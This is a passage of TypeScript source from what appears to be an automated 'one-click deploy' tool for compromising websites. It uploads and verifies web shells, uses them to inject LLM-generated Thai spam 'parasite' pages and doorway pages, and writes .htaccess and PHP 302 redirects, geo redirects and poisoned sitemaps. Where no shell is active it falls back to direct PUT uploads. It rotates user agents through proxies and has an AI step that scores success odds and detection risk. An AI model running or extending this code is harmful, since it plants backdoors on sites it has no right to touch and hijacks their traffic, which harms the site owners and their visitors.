          onProgress?.({ type: "step_detail", phase: 4, detail: `Trying ${altShell.platform.toUpperCase()} shell: ${altShell.filename}...` });
          const altShellObj: GeneratedShell = {
            filename: altShell.filename,
            password: altShell.password,
            code: altShell.code,
            obfuscatedCode: altShell.code,
            layers: [{ method: altShell.platform, description: altShell.description }],
            finalPayload: altShell.code,
          };
          const paths = scanResult.bestUploadPath
            ? [scanResult.bestUploadPath, ...UPLOAD_SCAN_PATHS.filter(p => p !== scanResult.bestUploadPath).slice(0, 3)]
            : UPLOAD_SCAN_PATHS.slice(0, 4);
          const altResults = await uploadShell(target, altShellObj, paths, opts.uploadTimeout || 8000, undefined, opts.methodPriority);
          const altSuccess = altResults.find(u => u.success);
          if (altSuccess?.shellUrl) {
            activeShellUrl = altSuccess.shellUrl;
            uploadResults = altResults;
            step3.status = "success";
            step3.details = `${altShell.platform.toUpperCase()} shell uploaded: ${altSuccess.shellUrl} (method: ${altSuccess.method}) [PHP failed, ${altShell.platform.toUpperCase()} succeeded]`;
            step3.artifacts = [{
              type: "shell", filename: altShell.filename, url: altSuccess.shellUrl,
              status: "deployed", description: `${altShell.platform.toUpperCase()} shell via ${altSuccess.method}`,
            }];
            onProgress?.({ type: "step_detail", phase: 4, detail: `✅ ${altShell.platform.toUpperCase()} shell uploaded successfully!` });
            break;
          }
        } catch (altErr: any) {
          onProgress?.({ type: "step_detail", phase: 4, detail: `${altShell.platform.toUpperCase()} shell failed: ${altErr.message}` });
        }
      }
    }
    
    if (!activeShellUrl) {
      step3.status = "failed";
      step3.errorCategory = classifyError(e);
      step3.details = `All shell uploads failed (PHP + ${detectedPlatforms.filter(p => p !== "php").map(p => p.toUpperCase()).join("/") || "no alt"}) after ${maxRetries} retries: ${e.message}`;
      errorBreakdown[step3.errorCategory]++;
    }
  }
  clearTimeout(uploadStepTimer);
  step3.endTime = Date.now();
  step3.duration = step3.endTime - step3.startTime!;
  onProgress?.({ type: "phase_complete", phase: 4, phaseName: "Upload Shell", status: step3.status as any, progress: 44, detail: step3.details, elapsed: Date.now() - startTime });

  // ─── AI: Adapt after shell upload ───
  if (aiStrategy) {
    const shellUploadAnalysis: StepAnalysis = {
      stepName: "upload_shell",
      success: !!activeShellUrl,
      details: step3.details,
      aiRecommendation: activeShellUrl ? "Shell uploaded — proceed to verification" : "Shell upload failed — rely on direct upload results",
      adaptedStrategy: null,
      nextStepAdjustments: [],
    };
    aiStrategy = adaptStrategyAfterStep(aiStrategy, shellUploadAnalysis);
    aiStepAnalyses.push(shellUploadAnalysis);
    if (aiIntel) aiIntel.strategy = aiStrategy;
    onProgress?.({
      type: "ai_probability",
      step: "after_shell_upload",
      detail: `\ud83e\udd16 Success probability: ${aiStrategy.overallSuccessProbability}%`,
      probability: aiStrategy.overallSuccessProbability,
    });
  }

  // ─── Step 5: Verify Shell (with retry + recheck) ───
  const step4: DeployStep = {
    step: 5, name: "✅ Verify Shell", status: "running", retries: 0,
    startTime: Date.now(), details: "Testing shell with 5 verification commands...",
  };
  result.steps.push(step4);
  onProgress?.({ type: "phase_start", phase: 5, phaseName: "Verify Shell", status: "running", progress: 44 });

  let shellActive = false;
  if (activeShellUrl) {
    try {
      const { result: vr, retries } = await withRetry(
        async () => {
          const r = await verifyShellActive(activeShellUrl!, shell.password, opts.verifyTimeout);
          if (!r.active) throw new Error(`Shell inactive: ${r.passedCount}/${r.tests.length} tests passed`);
          return r;
        },
        { maxRetries, baseDelay: retryBaseDelay, backoffFactor: retryBackoffFactor, stepName: "verify", onProgress },
      );
      shellActive = vr.active;
      step4.retries = retries;
      totalRetries += retries;

      step4.status = "success";
      step4.details = `Shell ACTIVE: ${vr.passedCount}/${vr.tests.length} tests passed${retries > 0 ? ` [${retries} retries]` : ""}`;
      step4.artifacts = vr.tests.map(t => ({
        type: "config" as const, filename: t.command.slice(0, 30),
        status: t.passed ? "deployed" as const : "failed" as const, description: t.response.slice(0, 100),
      }));

      result.shellInfo = {
        url: activeShellUrl,
        password: shell.password,
        filename: shell.filename,
        active: shellActive,
        obfuscationLayers: shell.layers.length,
      };

      // Shell recheck after delay (from seo_engine.py)
      if (shellActive && opts.shellRecheckDelay !== 0) {
        const recheckDelay = opts.shellRecheckDelay ?? 10000;
        onProgress?.({ type: "step_detail", step: "recheck", detail: `Waiting ${recheckDelay / 1000}s before shell recheck...` });
        await sleep(recheckDelay);
        const recheck = await verifyShellActive(activeShellUrl, shell.password, opts.verifyTimeout);
        result.shellInfo.recheckActive = recheck.active;
        if (!recheck.active) {
          step4.details += ` (⚠️ recheck after ${recheckDelay / 1000}s: INACTIVE — ${recheck.passedCount}/${recheck.tests.length})`;
        } else {
          step4.details += ` (✅ recheck after ${recheckDelay / 1000}s: still ACTIVE)`;
        }
      }
    } catch (e: any) {
      step4.status = "failed";
      step4.errorCategory = classifyError(e);
      step4.details = `Verification failed after ${maxRetries} retries: ${e.message}`;
      errorBreakdown[step4.errorCategory]++;
    }
  } else {
    step4.status = "skipped";
    step4.details = "No shell uploaded — skipping verification";
  }
  step4.endTime = Date.now();
  step4.duration = step4.endTime - step4.startTime!;
  onProgress?.({ type: "phase_complete", phase: 5, phaseName: "Verify Shell", status: step4.status as any, progress: 50, detail: step4.details, elapsed: Date.now() - startTime });

  // ─── AI: Adapt after shell verification ───
  if (aiStrategy) {
    const verifyAnalysis: StepAnalysis = {
      stepName: "verify_shell",
      success: shellActive,
      details: step4.details,
      aiRecommendation: shellActive ? "Shell verified active — full deployment capability" : "Shell not active — limited to direct upload files",
      adaptedStrategy: null,
      nextStepAdjustments: [],
    };
    aiStrategy = adaptStrategyAfterStep(aiStrategy, verifyAnalysis);
    aiStepAnalyses.push(verifyAnalysis);
    if (aiIntel) aiIntel.strategy = aiStrategy;

    // Run AI step analysis (LLM) in background
    aiAnalyzeStepResult("verify_shell", step4.details, aiIntel!.targetProfile, aiStrategy).then(analysis => {
      onProgress?.({
        type: "ai_adaptation",
        step: "ai_step_analysis",
        detail: `\ud83e\udde0 AI: ${analysis.recommendation}`,
        probability: analysis.newProbability,
        aiAnalysis: { recommendation: analysis.recommendation, adjustments: analysis.adjustments, alternativeApproach: analysis.alternativeApproach },
      });
    }).catch(() => {});

    onProgress?.({
      type: "ai_probability",
      step: "after_verify_shell",
      detail: `\ud83e\udd16 โอกาสสำเร็จ: ${aiStrategy.overallSuccessProbability}% | กลยุทธ์: ${aiStrategy.adaptations[aiStrategy.adaptations.length - 1] || "ไม่เปลี่ยนแปลง"}`,
      probability: aiStrategy.overallSuccessProbability,
    });
  }

  // ─── Step 6: Generate & Inject SEO Parasite Pages ───
  const stepParasite: DeployStep = {
    step: 6, name: "🕷️ SEO Parasite Pages", status: "running", retries: 0,
    startTime: Date.now(), details: "Generating Thai SEO content via LLM and injecting parasite pages...",
  };
  result.steps.push(stepParasite);
  onProgress?.({ type: "phase_start", phase: 6, phaseName: "SEO Parasite Pages", status: "running", progress: 50 });

  const shouldGenerateParasite = (opts.enableParasitePages !== false) && opts.seoKeywords && opts.seoKeywords.length > 0;

  if (shouldGenerateParasite && shellActive && activeShellUrl) {
    try {
      let parasitePages: { html: string; filename: string; title: string; keywords: string[]; wordCount: number; seoScore: number; features: string[] }[];

      // Use template if slug provided, otherwise use LLM
      if (opts.parasiteTemplateSlug) {
        const { generateFromTemplate } = await import("./parasite-templates");
        onProgress?.({ type: "step_detail", step: "parasite_gen", detail: `Generating parasite pages using template "${opts.parasiteTemplateSlug}" (instant, no LLM)...` });

        const templateInput = {
          keywords: opts.seoKeywords!,
          redirectUrl: redirect,
          targetDomain: target.replace(/^https?:\/\//, "").replace(/\/$/, ""),
          redirectDelay: opts.parasiteRedirectDelay ?? 5,
        };

        // Generate main page + variations for each keyword
        parasitePages = [];
        const mainResult = generateFromTemplate(opts.parasiteTemplateSlug, templateInput);
        const mainKw = opts.seoKeywords![0] || "page";
        parasitePages.push({
          html: mainResult.html,
          filename: `${mainKw.replace(/[^a-zA-Z0-9ก-๙]/g, "-").toLowerCase()}-${Date.now()}.html`,
          title: mainResult.title,
          keywords: opts.seoKeywords!,
          wordCount: mainResult.wordCount,
          seoScore: mainResult.seoScore,
          features: ["template", opts.parasiteTemplateSlug, "schema", "og", "breadcrumb"],
        });

        // Additional pages for each keyword variation
        if (opts.seoKeywords!.length > 1) {
          for (const kw of opts.seoKeywords!.slice(1, 4)) {
            const subInput = { ...templateInput, keywords: [kw, ...opts.seoKeywords!.filter(k => k !== kw).slice(0, 2)] };
            const subResult = generateFromTemplate(opts.parasiteTemplateSlug, subInput);
            parasitePages.push({
              html: subResult.html,
              filename: `${kw.replace(/[^a-zA-Z0-9ก-๙]/g, "-").toLowerCase()}-${Date.now()}.html`,
              title: subResult.title,
              keywords: [kw],
              wordCount: subResult.wordCount,
              seoScore: subResult.seoScore,
              features: ["template", opts.parasiteTemplateSlug],
            });
          }
        }
      } else {
        const { generateMultipleParasitePages } = await import("./seo-parasite-generator");
        onProgress?.({ type: "step_detail", step: "parasite_gen", detail: `Generating Thai SEO content for ${opts.seoKeywords!.length} keywords via LLM...` });

        parasitePages = await generateMultipleParasitePages(
          opts.seoKeywords!,
          redirect,
          target,
          {
            contentLength: opts.parasiteContentLength ?? "medium",
            redirectDelay: opts.parasiteRedirectDelay ?? 5,
            language: "th",
          },
        );
      }

      onProgress?.({ type: "step_detail", step: "parasite_inject", detail: `Injecting ${parasitePages.length} parasite pages via shell...` });

      // Inject each parasite page via shell
      const testUrl = `${activeShellUrl}?k=${shell.password}`;
      let deployedCount = 0;

      for (const page of parasitePages) {
        try {
          const response = await proxyFetch(testUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded",
              "User-Agent": randomUA(),
            },
            body: `file=${encodeURIComponent(page.filename)}&content=${encodeURIComponent(page.html)}`,
          }, opts.uploadTimeout || 15000);

          const text = await response.text();
          const success = text.includes("FILE_WRITTEN") || text.includes("OK") || response.status === 200;

          const basePath = new URL(activeShellUrl).pathname.split("/").slice(0, -1).join("/");
          const pageUrl = `${target}${basePath}/${page.filename}`;

          result.parasiteInfo.pages.push({
            filename: page.filename,
            title: page.title,
            wordCount: page.wordCount,
            seoScore: page.seoScore,
            url: pageUrl,
            deployed: success,
          });

          if (success) {
            deployedCount++;
            result.deployedFiles.push({
              type: "page",
              filename: page.filename,
              url: pageUrl,
              status: "deployed",
              description: `SEO Parasite: ${page.title} (${page.wordCount} words, SEO: ${page.seoScore}/100)`,
            });
          }

          onProgress?.({ type: "step_detail", step: "parasite_inject", detail: `Injected ${deployedCount}/${parasitePages.length}: ${page.filename} (${page.wordCount} words, SEO: ${page.seoScore}/100)` });
        } catch (e: any) {
          result.parasiteInfo.pages.push({
            filename: page.filename,
            title: page.title,
            wordCount: page.wordCount,
            seoScore: page.seoScore,
            deployed: false,
          });
        }
      }

      result.parasiteInfo.generated = true;
      result.parasiteInfo.pagesCount = parasitePages.length;
      result.parasiteInfo.totalWordCount = parasitePages.reduce((sum, p) => sum + p.wordCount, 0);
      result.parasiteInfo.avgSeoScore = Math.round(parasitePages.reduce((sum, p) => sum + p.seoScore, 0) / parasitePages.length);

      stepParasite.status = deployedCount > 0 ? "success" : "failed";
      stepParasite.details = `${deployedCount}/${parasitePages.length} parasite pages deployed (${result.parasiteInfo.totalWordCount} total words, avg SEO score: ${result.parasiteInfo.avgSeoScore}/100)`;
      stepParasite.artifacts = result.parasiteInfo.pages.map(p => ({
        type: "page" as const,
        filename: p.filename,
        url: p.url,
        status: p.deployed ? "deployed" as const : "failed" as const,
        description: `${p.title} (${p.wordCount}w, SEO:${p.seoScore})`,
      }));
    } catch (e: any) {
      stepParasite.status = "failed";
      stepParasite.errorCategory = classifyError(e);
      stepParasite.details = `Parasite generation failed: ${e.message}`;
      errorBreakdown[stepParasite.errorCategory]++;
    }
  } else if (shouldGenerateParasite && !shellActive) {
    // Try direct upload of parasite pages
    try {
      let parasitePages: { html: string; filename: string; title: string; keywords: string[]; wordCount: number; seoScore: number; features: string[] }[];

      if (opts.parasiteTemplateSlug) {
        const { generateFromTemplate } = await import("./parasite-templates");
        onProgress?.({ type: "step_detail", step: "parasite_gen", detail: `Generating parasite pages using template "${opts.parasiteTemplateSlug}" (no shell — direct upload)...` });

        const templateInput = {
          keywords: opts.seoKeywords!,
          redirectUrl: redirect,
          targetDomain: target.replace(/^https?:\/\//, "").replace(/\/$/, ""),
          redirectDelay: opts.parasiteRedirectDelay ?? 5,
        };

        parasitePages = [];
        const mainResult = generateFromTemplate(opts.parasiteTemplateSlug, templateInput);
        const mainKw = opts.seoKeywords![0] || "page";
        parasitePages.push({
          html: mainResult.html,
          filename: `${mainKw.replace(/[^a-zA-Z0-9\u0e01-\u0e59]/g, "-").toLowerCase()}-${Date.now()}.html`,
          title: mainResult.title,
          keywords: opts.seoKeywords!,
          wordCount: mainResult.wordCount,
          seoScore: mainResult.seoScore,
          features: ["template", opts.parasiteTemplateSlug],
        });

        if (opts.seoKeywords!.length > 1) {
          for (const kw of opts.seoKeywords!.slice(1, 4)) {
            const subInput = { ...templateInput, keywords: [kw, ...opts.seoKeywords!.filter(k => k !== kw).slice(0, 2)] };
            const subResult = generateFromTemplate(opts.parasiteTemplateSlug, subInput);
            parasitePages.push({
              html: subResult.html,
              filename: `${kw.replace(/[^a-zA-Z0-9\u0e01-\u0e59]/g, "-").toLowerCase()}-${Date.now()}.html`,
              title: subResult.title,
              keywords: [kw],
              wordCount: subResult.wordCount,
              seoScore: subResult.seoScore,
              features: ["template", opts.parasiteTemplateSlug],
            });
          }
        }
      } else {
        const { generateMultipleParasitePages } = await import("./seo-parasite-generator");
        onProgress?.({ type: "step_detail", step: "parasite_gen", detail: `Generating Thai SEO content (no shell — will try direct upload)...` });

        parasitePages = await generateMultipleParasitePages(
          opts.seoKeywords!,
          redirect,
          target,
          {
            contentLength: opts.parasiteContentLength ?? "medium",
            redirectDelay: opts.parasiteRedirectDelay ?? 5,
            language: "th",
          },
        );
      }

      // Try direct upload for each page
      const paths = scanResult.bestUploadPath
        ? [scanResult.bestUploadPath, ...UPLOAD_SCAN_PATHS.filter(p => p !== scanResult.bestUploadPath).slice(0, 3)]
        : UPLOAD_SCAN_PATHS.slice(0, 4);

      let deployedCount = 0;
      for (const page of parasitePages) {
        for (const path of paths) {
          try {
            const uploadUrl = `${target}${path}${page.filename}`;
            const formData = new FormData();
            formData.append("file", new Blob([page.html], { type: "application/x-php" }), page.filename);

            const response = await proxyFetch(uploadUrl, {
              method: "PUT",
              headers: { "User-Agent": randomUA() },
              body: formData,
            }, opts.uploadTimeout || 15000);

            if (response.ok || response.status === 201) {
              deployedCount++;
              result.parasiteInfo.pages.push({
                filename: page.filename,
                title: page.title,
                wordCount: page.wordCount,
                seoScore: page.seoScore,
                url: uploadUrl,
                deployed: true,
              });
              result.deployedFiles.push({
                type: "page",
                filename: page.filename,
                url: uploadUrl,
                status: "deployed",
                description: `SEO Parasite (direct): ${page.title} (${page.wordCount}w)`,
              });
              break; // success, move to next page
            }
          } catch { /* try next path */ }
        }
      }

      result.parasiteInfo.generated = parasitePages.length > 0;
      result.parasiteInfo.pagesCount = parasitePages.length;
      result.parasiteInfo.totalWordCount = parasitePages.reduce((sum, p) => sum + p.wordCount, 0);
      result.parasiteInfo.avgSeoScore = Math.round(parasitePages.reduce((sum, p) => sum + p.seoScore, 0) / parasitePages.length);

      stepParasite.status = deployedCount > 0 ? "success" : "failed";
      stepParasite.details = `${deployedCount}/${parasitePages.length} parasite pages deployed via direct upload (no shell)`;
    } catch (e: any) {
      stepParasite.status = "failed";
      stepParasite.errorCategory = classifyError(e);
      stepParasite.details = `Parasite generation failed: ${e.message}`;
      errorBreakdown[stepParasite.errorCategory]++;
    }
  } else {
    stepParasite.status = "skipped";
    stepParasite.details = shouldGenerateParasite ? "No active shell and no upload paths" : "No SEO keywords provided — skipping parasite page generation";
  }
  stepParasite.endTime = Date.now();
  stepParasite.duration = stepParasite.endTime - stepParasite.startTime!;
  onProgress?.({ type: "phase_complete", phase: 6, phaseName: "SEO Parasite Pages", status: stepParasite.status as any, progress: 62, detail: stepParasite.details, elapsed: Date.now() - startTime });

  // ─── Step 7: Deploy SEO Files via Shell (with retry) ───
  const step5: DeployStep = {
    step: 7, name: "📁 Deploy SEO Files (via Shell)", status: "running", retries: 0,
    startTime: Date.now(), details: "Deploying doorway pages, redirects, sitemap, geo redirect, meta injections via shell...",
  };
  result.steps.push(step5);
  onProgress?.({ type: "phase_start", phase: 7, phaseName: "Deploy Files (Shell)", status: "running", progress: 62 });

  if (shellActive && activeShellUrl) {
    try {
      const { result: dr, retries } = await withRetry(
        () => deployFiles(activeShellUrl!, shell.password, target, redirect, {
          geoRedirectEnabled: opts.geoRedirectEnabled,
          landingHtml: opts.landingHtml,
          timeout: opts.uploadTimeout,
          seoKeywords: opts.seoKeywords,
        }),
        { maxRetries: Math.min(maxRetries, 3), baseDelay: retryBaseDelay, backoffFactor: retryBackoffFactor, stepName: "deploy", onProgress },
      );
      step5.retries = retries;
      totalRetries += retries;

      const deployed = dr.filter(f => f.success);
      // Merge with any files already deployed via direct upload (Step 2)
      const existingFiles = [...result.deployedFiles];
      const shellDeployedFiles = dr.map(f => ({
        type: f.type.includes("doorway") ? "page" as const :
              f.type.includes("htaccess") ? "htaccess" as const :
              f.type.includes("redirect") || f.type.includes("geo") ? "redirect" as const :
              f.type.includes("sitemap") ? "sitemap" as const : "config" as const,
        filename: f.filename,
        url: f.url,
        status: f.success ? "deployed" as const : "failed" as const,
        description: f.type,
      }));
      result.deployedFiles = [...existingFiles, ...shellDeployedFiles];

      // Use OR to preserve flags set by direct upload (Step 2)
      result.redirectInfo.doorwayPagesDeployed += dr.filter(f => f.type === "doorway_page" && f.success).length;
      result.redirectInfo.htaccessDeployed = result.redirectInfo.htaccessDeployed || dr.some(f => f.type === "htaccess_redirect" && f.success);
      result.redirectInfo.phpRedirectDeployed = result.redirectInfo.phpRedirectDeployed || dr.some(f => f.type === "php_redirect" && f.success);
      result.redirectInfo.jsRedirectDeployed = result.redirectInfo.jsRedirectDeployed || dr.some(f => f.type === "js_redirect" && f.success);
      result.redirectInfo.metaRefreshDeployed = result.redirectInfo.metaRefreshDeployed || dr.some(f => f.type === "meta_injection" && f.success);
      result.redirectInfo.sitemapPoisoned = result.redirectInfo.sitemapPoisoned || dr.some(f => f.type === "sitemap_poison" && f.success);
      result.redirectInfo.geoRedirectDeployed = result.redirectInfo.geoRedirectDeployed || dr.some(f => f.type === "geo_redirect" && f.success);

      step5.status = deployed.length > 0 ? "success" : "failed";
      step5.details = `${deployed.length}/${dr.length} files deployed via shell (${result.redirectInfo.doorwayPagesDeployed} doorways, ${result.redirectInfo.htaccessDeployed ? "✓" : "✗"} .htaccess, ${result.redirectInfo.phpRedirectDeployed ? "✓" : "✗"} PHP, ${result.redirectInfo.jsRedirectDeployed ? "✓" : "✗"} JS, ${result.redirectInfo.geoRedirectDeployed ? "✓" : "✗"} Geo)`;
      step5.artifacts = result.deployedFiles;
    } catch (e: any) {
      step5.status = "failed";
      step5.errorCategory = classifyError(e);
      step5.details = `Deploy failed: ${e.message}`;
      errorBreakdown[step5.errorCategory]++;
    }
  } else {
    // Fallback: try direct upload of redirect files without shell
    try {
      const paths = scanResult.bestUploadPath
        ? [scanResult.bestUploadPath, ...UPLOAD_SCAN_PATHS.filter(p => p !== scanResult.bestUploadPath).slice(0, 5)]
        : UPLOAD_SCAN_PATHS.slice(0, 6);

      let directDeployed = 0;

      // Try .htaccess upload
      const htaccessContent = `RewriteEngine On\nRewriteCond %{REQUEST_URI} !^/wp-admin\nRewriteCond %{REQUEST_URI} !^/wp-login\nRewriteRule ^(.*)$ ${redirect} [R=302,L]`;
      for (const path of paths) {
        try {
          const htUrl = `${target}${path}.htaccess`;
          const htResp = await proxyFetch(htUrl, {
            method: "PUT",
            headers: { "User-Agent": randomUA(), "Content-Type": "text/plain" },
            body: htaccessContent,
          }, opts.uploadTimeout || 15000);
          if (htResp.ok || htResp.status === 201) {
            directDeployed++;
            result.redirectInfo.htaccessDeployed = true;
            result.redirectInfo.directUploadUsed = true;
            result.deployedFiles.push({
              type: "htaccess", filename: ".htaccess", url: htUrl,
              status: "deployed", description: "Direct upload .htaccess 302",
            });
            break;
          }
        } catch { /* try next path */ }
      }

      // Try PHP redirect upload
      const phpContent = `<?php header("Location: ${redirect}", true, 302); exit; ?>`;
      const phpFilename = `redirect-${Date.now().toString(36)}.php`;
      for (const path of paths) {
        try {
          const phpUrl = `${target}${path}${phpFilename}`;
          const phpResp = await proxyFetch(phpUrl, {
            method: "PUT",
            headers: { "User-Agent": randomUA(), "Content-Type": "application/x-php" },
            body: phpContent,
          }, opts.uploadTimeout || 15000);
          if (phpResp.ok || phpResp.status === 201) {
            directDeployed++;
            result.redirectInfo.phpRedirectDeployed = true;
            result.redirectInfo.directUploadUsed = true;
            result.deployedFiles.push({
              type: "redirect", filename: phpFilename, url: phpUrl,
              status: "deployed", description: "Direct upload PHP 302",
            });
            break;
          }
        } catch { /* try next path */ }
      }

      step5.status = directDeployed > 0 ? "success" : "failed";
      step5.details = directDeployed > 0
        ? `${directDeployed} redirect file(s) deployed via direct upload (no shell)`
        : "No active shell and direct upload failed \u2014 all paths rejected";
    } catch (e: any) {
      step5.status = "failed";
      step5.details = `No shell + direct upload error: ${e.message}`;
    }
  }
  step5.endTime = Date.now();
  step5.duration = step5.endTime - step5.startTime!;
  onProgress?.({ type: "phase_complete", phase: 7, phaseName: "Deploy Files (Shell)", status: step5.status as any, progress: 75, detail: step5.details, elapsed: Date.now() - startTime });

  // ─── Step 8: Setup Redirect ───
  const step6: DeployStep = {
    step: 8, name: "🔀 Setup Redirect", status: "running", retries: 0,
    startTime: Date.now(), details: "Configuring redirect rules...",
  };
  result.steps.push(step6);
  onProgress?.({ type: "phase_start", phase: 8, phaseName: "Setup Redirect", status: "running", progress: 75 });

  const anyRedirectDeployed = result.redirectInfo.htaccessDeployed ||
    result.redirectInfo.phpRedirectDeployed ||
    result.redirectInfo.jsRedirectDeployed ||
    result.redirectInfo.metaRefreshDeployed ||
    result.redirectInfo.geoRedirectDeployed ||
    result.redirectInfo.directUploadUsed;

  if (anyRedirectDeployed) {
    step6.status = "success";
    const methods: string[] = [];
    if (result.redirectInfo.directUploadUsed) methods.push("⚡ Direct upload");
    if (result.redirectInfo.htaccessDeployed) methods.push(".htaccess 302");
    if (result.redirectInfo.phpRedirectDeployed) methods.push("PHP 302");
    if (result.redirectInfo.jsRedirectDeployed) methods.push("JS obfuscated");
    if (result.redirectInfo.metaRefreshDeployed) methods.push("Meta refresh");
    if (result.redirectInfo.geoRedirectDeployed) methods.push("Geo redirect (TH→redirect)");
    step6.details = `Redirect active via: ${methods.join(", ")}`;
  } else if (shellActive) {
    step6.status = "failed";
    step6.details = "No redirect files deployed successfully";
  } else if (directUploadSuccess) {
    step6.status = "success";
    step6.details = "Redirect active via direct upload (no shell needed)";
  } else {
    step6.status = "skipped";
    step6.details = "No active shell and no direct upload — skipping redirect setup";
  }
  step6.endTime = Date.now();
  step6.duration = step6.endTime - step6.startTime!;
  onProgress?.({ type: "phase_complete", phase: 8, phaseName: "Setup Redirect", status: step6.status as any, progress: 85, detail: step6.details, elapsed: Date.now() - startTime });

  // ─── Step 9: Verify Redirect (with retry) ───
  const step7: DeployStep = {
    step: 9, name: "🔗 Verify Redirect", status: "running", retries: 0,
    startTime: Date.now(), details: "Testing if redirect is working...",
  };
  result.steps.push(step7);
  onProgress?.({ type: "phase_start", phase: 9, phaseName: "Verify Redirect", status: "running", progress: 85 });

  if (anyRedirectDeployed) {
    try {
      // Collect all deployed file URLs for individual verification
      const deployedFileUrls = result.deployedFiles
        .filter(f => f.status === "deployed" && f.url)
        .map(f => f.url!);

      const { result: vr, retries } = await withRetry(
        () => verifyRedirect(target, redirect, opts.verifyTimeout, deployedFileUrls),
        { maxRetries: Math.min(maxRetries, 3), baseDelay: retryBaseDelay, backoffFactor: retryBackoffFactor, stepName: "verify_redirect", onProgress },
      );
      step7.retries = retries;
      totalRetries += retries;

      const working = vr.some(r => r.working);
      result.redirectInfo.verifiedWorking = working;
      // Populate verified redirect URLs — only links that actually redirect
      result.redirectInfo.verifiedRedirectUrls = vr
        .filter(r => r.working && r.redirectsTo)
        .map(r => ({ url: r.url, redirectsTo: r.redirectsTo!, statusCode: r.statusCode, method: r.method }));
      step7.status = working ? "success" : "failed";
      step7.details = working
        ? `Redirect verified! ${vr.filter(r => r.working).map(r => r.method).join(", ")} → ${redirect} (${result.redirectInfo.verifiedRedirectUrls.length} verified links)`
        : `Redirect not detected (may need time to propagate)`;
      step7.artifacts = vr.map(r => ({
        type: "redirect" as const, filename: r.method,
        url: r.redirectsTo || undefined,
        status: r.working ? "deployed" as const : "failed" as const,
        description: `${r.method}: ${r.statusCode} → ${r.redirectsTo || "no redirect"}`,
      }));
    } catch (e: any) {
      step7.status = "failed";
      step7.errorCategory = classifyError(e);
      step7.details = `Verify failed: ${e.message}`;
      errorBreakdown[step7.errorCategory]++;
    }
  } else {
    step7.status = "skipped";
    step7.details = "No redirects deployed — skipping verification";
  }
  step7.endTime = Date.now();
  step7.duration = step7.endTime - step7.startTime!;

  // ─── AI: Adapt after file deployment ───
  if (aiStrategy) {
    const deployAnalysis: StepAnalysis = {
      stepName: "deploy_files",
      success: step5.status === "success",
      details: step5.details,
      aiRecommendation: step5.status === "success" ? "Files deployed successfully" : "File deployment had issues",
      adaptedStrategy: null,
      nextStepAdjustments: [],
    };
    aiStrategy = adaptStrategyAfterStep(aiStrategy, deployAnalysis);
    aiStepAnalyses.push(deployAnalysis);
    if (aiIntel) aiIntel.strategy = aiStrategy;
    onProgress?.({
      type: "ai_probability",
      step: "after_deploy_files",
      detail: `\ud83e\udd16 โอกาสสำเร็จสุดท้าย: ${aiStrategy.overallSuccessProbability}%`,
      probability: aiStrategy.overallSuccessProbability,
    });
  }

  // ─── Summary ───
  result.summary.totalDuration = Date.now() - startTime;
  result.summary.successSteps = result.steps.filter(s => s.status === "success").length;
  result.summary.failedSteps = result.steps.filter(s => s.status === "failed").length;
  result.summary.skippedSteps = result.steps.filter(s => s.status === "skipped").length;
  result.summary.totalFilesDeployed = result.deployedFiles.filter(f => f.status === "deployed").length;
  // KEY FIX: Only mark redirectActive if we have VERIFIED working redirects
  result.summary.redirectActive = result.redirectInfo.verifiedWorking;
  result.summary.totalRetries = totalRetries;
  result.summary.errorBreakdown = errorBreakdown;

  // ─── Set top-level success flag ───
  // Success = redirect verified working OR at least 1 file deployed successfully
  result.success = result.summary.redirectActive || result.summary.totalFilesDeployed > 0;

  // ─── AI: Post-deploy analysis (LLM) ───
  if (aiIntel && aiStrategy) {
    try {
      const postAnalysis = await aiPostDeployAnalysis(
        aiIntel.targetProfile,
        aiStrategy,
        aiStepAnalyses,
        result.summary.redirectActive,
      );
      aiIntel.finalAnalysis = {
        overallSuccess: result.summary.redirectActive,
        lessonsLearned: postAnalysis.lessonsLearned,
        improvementsForNextDeploy: postAnalysis.improvementsForNextDeploy,
        detectionRisk: postAnalysis.detectionRisk as "low" | "medium" | "high",
      };
      aiIntel.stepAnalyses = aiStepAnalyses;

      onProgress?.({
        type: "ai_analysis",
        step: "post_deploy",
        status: result.summary.redirectActive ? "success" : "failed",
        detail: `\ud83e\udde0 AI สรุปหลังดีพลอย: ${postAnalysis.summary}`,
        probability: aiStrategy.overallSuccessProbability,
        aiAnalysis: {
          summary: postAnalysis.summary,
          lessonsLearned: postAnalysis.lessonsLearned,
          improvements: postAnalysis.improvementsForNextDeploy,
          detectionRisk: postAnalysis.detectionRisk,
          successFactors: postAnalysis.successFactors,
          failureFactors: postAnalysis.failureFactors,
        },
      });
    } catch (e) {
      // Non-blocking
    }

    result.aiIntelligence = {
      targetProfile: aiIntel.targetProfile,
      strategy: aiStrategy,
      stepAnalyses: aiStepAnalyses,
      finalAnalysis: aiIntel.finalAnalysis,
    };
  }

  result.report = generateDeployReport(result);

  onProgress?.({
    type: "complete",
    status: result.success ? "success" : "failed",
    progress: 100,
    detail: `Deploy complete: ${result.summary.successSteps}/${result.summary.totalSteps} steps, ${result.summary.totalFilesDeployed} files, ${totalRetries} retries`,
    elapsed: result.summary.totalDuration,
    data: result,
  });

  return result;
}

// ═══════════════════════════════════════════════════════
//  REPORT GENERATION
// ═══════════════════════════════════════════════════════

function generateDeployReport(result: DeployResult): string {
  const lines: string[] = [];
  lines.push(`═══════════════════════════════════════════════`);
  lines.push(`  ONE-CLICK DEPLOY REPORT (Enterprise-Grade)`);
  lines.push(`  ${result.timestamp}`);
  lines.push(`═══════════════════════════════════════════════`);
  lines.push(``);
  lines.push(`Target: ${result.targetDomain}`);
  lines.push(`Redirect: ${result.redirectUrl}`);
  lines.push(`Duration: ${(result.summary.totalDuration / 1000).toFixed(1)}s`);
  lines.push(`Total Retries: ${result.summary.totalRetries}`);
  lines.push(``);

  // Error breakdown
  const errors = Object.entries(result.summary.errorBreakdown).filter(([, v]) => v > 0);
  if (errors.length > 0) {
    lines.push(`── Error Breakdown ──`);
    for (const [cat, count] of errors) {
      lines.push(`  ${cat}: ${count}`);
    }
    lines.push(``);
  }

  lines.push(`── Steps ──`);
  for (const step of result.steps) {
    const icon = step.status === "success" ? "✅" : step.status === "failed" ? "❌" : step.status === "skipped" ? "⏭️" : "⏳";
    const retryInfo = step.retries > 0 ? ` [${step.retries} retries]` : "";
    const errInfo = step.errorCategory ? ` (${step.errorCategory})` : "";
    lines.push(`${icon} ${step.name} (${step.duration ? (step.duration / 1000).toFixed(1) + "s" : "N/A"})${retryInfo}${errInfo}`);
    lines.push(`   ${step.details}`);
  }
  lines.push(``);

  if (result.shellInfo) {
